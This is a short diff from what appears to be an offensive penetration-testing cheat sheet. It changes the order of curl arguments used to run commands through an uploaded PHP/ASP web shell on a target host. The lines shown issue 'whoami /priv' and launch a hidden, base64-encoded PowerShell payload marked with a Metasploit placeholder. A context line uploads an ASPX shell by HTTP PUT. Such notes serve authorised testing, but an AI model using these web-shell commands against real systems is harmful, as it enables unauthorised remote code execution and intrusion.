@@ -258,8 +258,8 @@ echo -e '<?xml version="1.0" encoding="UTF-8"?>\n<configuration>\n<system.webSer
 
 +---------- Execute ----------+
 -->> PHP and ASP
-curl -G --path-as-is 'http://$TARGET/x.php' --data-urlencode 'cmd=whoami /priv'
-curl -G --path-as-is 'http://$TARGET/x.php' --data-urlencode 'cmd=powershell.exe -nop -w hidden -e WwBOAGUAdAAuAFMAZQB...<METASPLOIT>...'
+curl -G 'http://$TARGET/x.php' --path-as-is --data-urlencode 'cmd=whoami /priv'
+curl -G 'http://$TARGET/x.php' --path-as-is --data-urlencode 'cmd=powershell.exe -nop -w hidden -e WwBOAGUAdAAuAFMAZQB...<METASPLOIT>...'
 
 -->> ASPX
 curl -X PUT -d @x.aspx http://$TARGET/x.txt
